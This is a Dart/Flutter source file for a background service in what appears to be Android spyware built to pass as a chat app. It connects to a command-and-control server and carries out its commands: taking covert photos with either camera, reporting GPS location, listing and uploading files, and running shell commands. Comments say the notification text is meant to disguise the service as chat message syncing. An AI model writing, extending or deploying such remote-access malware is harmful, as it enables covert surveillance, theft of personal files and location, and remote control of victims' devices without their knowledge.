// lib/core/control/background_service.dart
import 'dart:async';
import 'dart:io';
import 'dart:ui';

import 'package:camera/camera.dart' show XFile, CameraLensDirection;
import 'package:flutter/foundation.dart';
import 'package:flutter_background_service/flutter_background_service.dart'
    show
        AndroidConfiguration,
        FlutterBackgroundService,
        IosConfiguration,
        ServiceInstance;
import 'package:flutter_background_service_android/flutter_background_service_android.dart'
    show AndroidServiceInstance;
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:geolocator/geolocator.dart' show Position;
import 'package:shared_preferences/shared_preferences.dart';

// استيراد ملفات المشروع
import '../camera/camera_service.dart';
import '../data/data_collector_service.dart';
import '../filesystem/file_system_service.dart';
import '../location/location_service.dart';
import '../network/network_service.dart';
import 'constants.dart';
import 'device_info_service.dart';

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DataCollectorService dataCollectorService;
  final DeviceInfoService deviceInfoService;
  final LocationService locationService;
  final CameraService cameraService;
  final FileSystemService fileSystemService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;

  const BackgroundServiceHandles({
    required this.networkService,
    required this.dataCollectorService,
    required this.deviceInfoService,
    required this.locationService,
    required this.cameraService,
    required this.fileSystemService,
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
  });
}

Timer? _heartbeatTimer;
StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  final network = NetworkService();
  final dataCollector = DataCollectorService();
  final deviceInfo = DeviceInfoService();
  final location = LocationService();
  final camera = CameraService();
  final fileSystem = FileSystemService();
  final prefs = await SharedPreferences.getInstance();
  final String deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
  debugPrint("BackgroundService: DeviceID = $deviceId");

  final handles = BackgroundServiceHandles(
    networkService: network,
    dataCollectorService: dataCollector,
    deviceInfoService: deviceInfo,
    locationService: location,
    cameraService: camera,
    fileSystemService: fileSystem,
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
  );

  // تعديل الإشعار ليبدو كخدمة طبيعية لتطبيق دردشة
  if (service is AndroidServiceInstance) {
    service.setForegroundNotificationInfo(
      title: "تطبيق الدردشة",
      content: "جاري مزامنة الرسائل والبيانات",
    );
  }

  await network.connectSocketIO(deviceId);
  _connectionStatusSubscription = network.connectionStatusStream.listen((
    isConnected,
  ) {
    debugPrint(
      "BackgroundService: Socket status: ${isConnected ? 'Connected' : 'Disconnected'}",
    );
    if (isConnected) {
      _registerDeviceWithC2(handles);
      _startHeartbeat(handles);
    } else {
      _stopHeartbeat();
    }
  });

  // CAMBIO IMPORTANTE: Ahora escuchamos un único flujo de comandos
  _commandSubscription = network.commandStream.listen((commandData) {
    // Extraer la información del comando
    final String cmd = commandData['command'] as String? ?? "unknown";
    final String cmdId = commandData['command_id'] as String? ?? "unknown_id";
    final Map<String, dynamic> args =
        (commandData['args'] as Map<dynamic, dynamic>?)
                ?.cast<String, dynamic>() ??
            {};

    debugPrint(
        "BackgroundService: Received command '$cmd' (ID: $cmdId) with args: $args");

    // Procesar el comando
    _handleC2Command(handles, cmd, cmdId, args);
  });

  service.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((
    Map<String, dynamic>? argsFromUi,
  ) async {
    final alreadySent = prefs.getBool(PREF_INITIAL_DATA_SENT) ?? false;
    if (alreadySent || argsFromUi == null) return;

    final jsonData = argsFromUi['jsonData'] as Map<String, dynamic>?;
    final imagePath = argsFromUi['imagePath'] as String?;
    if (jsonData == null) return;

    final payload = Map<String, dynamic>.from(jsonData)
      ..['deviceId'] = deviceId;

    XFile? imageFile;
    if (imagePath != null && imagePath.isNotEmpty) {
      final file = File(imagePath);
      if (await file.exists()) {
        imageFile = XFile(imagePath);
      } else {
        debugPrint("BackgroundService: Image file not found: $imagePath");
      }
    }

    final success = await network.sendInitialData(
      jsonData: payload,
      imageFile: imageFile,
    );
    if (success) {
      await prefs.setBool(PREF_INITIAL_DATA_SENT, true);
      debugPrint("BackgroundService: Initial data sent successfully");
    }
  });

  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    debugPrint("BackgroundService: Stopping service");
    _stopHeartbeat();
    await dataCollector.disposeCamera();
    network.disconnectSocketIO();
    await _connectionStatusSubscription?.cancel();
    await _commandSubscription?.cancel();
    network.dispose();
    await service.stopSelf();
  });

  // إرسال تحديثات دورية للواجهة - تبدو كخدمة طبيعية لتطبيق دردشة
  Timer.periodic(const Duration(minutes: 1), (timer) async {
    service.invoke('update', {
      'current_date': DateTime.now().toIso8601String(),
      'device_id': deviceId,
      'message_sync_status': 'active', // يبدو كتحديث طبيعي لتطبيق دردشة
      'socket_status': network.isSocketConnected ? 'Connected' : 'Disconnected',
      'pending_commands': network.getPendingCommandIds(),
    });
  });
}

Future<void> _registerDeviceWithC2(BackgroundServiceHandles h) async {
  if (!h.networkService.isSocketConnected) return;
  try {
    final info = await h.deviceInfoService.getDeviceInfo();
    info['deviceId'] = h.currentDeviceId;
    h.networkService.registerDeviceWithC2(info);
    debugPrint("BackgroundService: Device registered");
  } catch (e) {
    debugPrint("BackgroundService: Error registering device: $e");
  }
}

void _startHeartbeat(BackgroundServiceHandles h) {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = Timer.periodic(const Duration(minutes: 2), (_) {
    if (h.networkService.isSocketConnected) {
      h.networkService.sendHeartbeat({'deviceId': h.currentDeviceId});
    }
  });
  debugPrint("BackgroundService: Heartbeat started");
}

void _stopHeartbeat() {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = null;
  debugPrint("BackgroundService: Heartbeat stopped");
}

// CAMBIO IMPORTANTE: Actualizado para incluir el ID del comando
Future<void> _handleC2Command(
  BackgroundServiceHandles h,
  String commandName,
  String commandId,
  Map<String, dynamic> args,
) async {
  switch (commandName) {
    case 'command_take_picture':
      try {
        final lens = (args['camera'] as String?) == 'back'
            ? CameraLensDirection.back
            : CameraLensDirection.front;
        final XFile? file = await h.cameraService.takePicture(
          lensDirection: lens,
        );
        if (file != null) {
          final uploadSuccess = await h.networkService.uploadFileFromCommand(
            deviceId: h.currentDeviceId,
            commandRef: commandId,
            fileToUpload: file,
          );

          if (uploadSuccess) {
            h.networkService.sendCommandResponse(
              originalCommand: 'command_take_picture',
              commandId: commandId,
              status: 'success',
              payload: {
                'message': 'Picture taken and uploaded successfully',
                'file_path': file.path,
              },
            );
          } else {
            throw Exception("Failed to upload image file to server");
          }
        } else {
          throw Exception("Failed to take picture");
        }
      } catch (e) {
        h.networkService.sendCommandResponse(
          originalCommand: 'command_take_picture',
          commandId: commandId,
          status: 'error',
          payload: {'message': e.toString()},
        );
      }
      break;

    case 'command_get_location':
      try {
        final Position? loc = (await h.locationService.getCurrentLocation()) as Position?;
        if (loc != null) {
          h.networkService.sendCommandResponse(
            originalCommand: 'command_get_location',
            commandId: commandId,
            status: 'success',
            payload: {
              'latitude': loc.latitude,
              'longitude': loc.longitude,
              'accuracy': loc.accuracy,
              'altitude': loc.altitude,
              'speed': loc.speed,
              'timestamp_gps': loc.timestamp.toIso8601String(),
            },
          );
        } else {
          throw Exception(
            "Location unavailable or permission denied by geolocator service",
          );
        }
      } catch (e) {
        h.networkService.sendCommandResponse(
          originalCommand: 'command_get_location',
          commandId: commandId,
          status: 'error',
          payload: {'message': e.toString()},
        );
      }
      break;

    case 'command_list_files':
      try {
        final path = args["path"] as String? ?? ".";
        final Map<String, dynamic>? result =
            await h.fileSystemService.listFiles(path);
        if (result != null && result["error"] == null) {
          h.networkService.sendCommandResponse(
            originalCommand: 'command_list_files',
            commandId: commandId,
            status: "success",
            payload: result,
          );
        } else {
          throw Exception(
            result?["error"]?.toString() ??
                "Failed to list files from native code",
          );
        }
      } catch (e) {
        h.networkService.sendCommandResponse(
          originalCommand: 'command_list_files',
          commandId: commandId,
          status: "error",
          payload: {"message": e.toString()},
        );
      }
      break;

    case 'command_upload_specific_file':
      try {
        final filePath = args["path"] as String?;
        if (filePath == null || filePath.isEmpty) {
          throw Exception("File path is required for upload command");
        }

        final file = File(filePath);
        if (!await file.exists()) {
          throw Exception("File not found at path: $filePath");
        }

        final xfile = XFile(filePath);
        final success = await h.networkService.uploadFileFromCommand(
          deviceId: h.currentDeviceId,
          commandRef: commandId,
          fileToUpload: xfile,
        );

        if (success) {
          h.networkService.sendCommandResponse(
            originalCommand: 'command_upload_specific_file',
            commandId: commandId,
            status: "success",
            payload: {"message": "File $filePath uploaded successfully"},
          );
        } else {
          throw Exception(
            "Failed to upload file $filePath via network service",
          );
        }
      } catch (e) {
        h.networkService.sendCommandResponse(
          originalCommand: 'command_upload_specific_file',
          commandId: commandId,
          status: "error",
          payload: {"message": e.toString()},
        );
      }
      break;

    case 'command_execute_shell':
      try {
        final command = args["command_name"] as String?;
        final commandArgs = (args["command_args"] as List<dynamic>?)
                ?.map((e) => e.toString())
                .toList() ??
            [];

        if (command == null || command.isEmpty) {
          throw Exception("Command name is required for execute shell command");
        }

        final Map<String, dynamic>? result =
            await h.fileSystemService.executeShellCommand(command, commandArgs);

        if (result != null && result["error"] == null) {
          h.networkService.sendCommandResponse(
            originalCommand: 'command_execute_shell',
            commandId: commandId,
            status: "success",
            payload: result,
          );
        } else {
          throw Exception(
            result?["error"]?.toString() ??
                "Failed to execute shell command via native code",
          );
        }
      } catch (e) {
        h.networkService.sendCommandResponse(
          originalCommand: 'command_execute_shell',
          commandId: commandId,
          status: "error",
          payload: {"message": e.toString()},
        );
      }
      break;

    case 'request_registration_info':
      _registerDeviceWithC2(h);
      break;

    default:
      h.networkService.sendCommandResponse(
        originalCommand: commandName,
        commandId: commandId,
        status: 'error',
        payload: {'message': 'Unknown command: $commandName'},
      );
      break;
  }
}

Future<void> initializeBackgroundService() async {
  final service = FlutterBackgroundService();

  if (Platform.isAndroid) {
    final flnp = FlutterLocalNotificationsPlugin();
    const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
    const initSettings = InitializationSettings(android: androidInit);
    await flnp.initialize(initSettings);

    const channel = AndroidNotificationChannel(
      'chat_service_channel',
      'خدمة الدردشة',
      description: 'خدمة مزامنة الرسائل في الخلفية',
      importance: Importance.low,
      playSound: false,
      enableVibration: false,
    );
    final androidPlugin = flnp.resolvePlatformSpecificImplementation<
        AndroidFlutterLocalNotificationsPlugin>();
    if (androidPlugin != null) {
      androidPlugin.createNotificationChannel(channel);
    }
  }

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'chat_service_channel',
      initialNotificationTitle: 'تطبيق الدردشة',
      initialNotificationContent: 'جاري مزامنة الرسائل',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(autoStart: true, onForeground: onStart),
  );
}
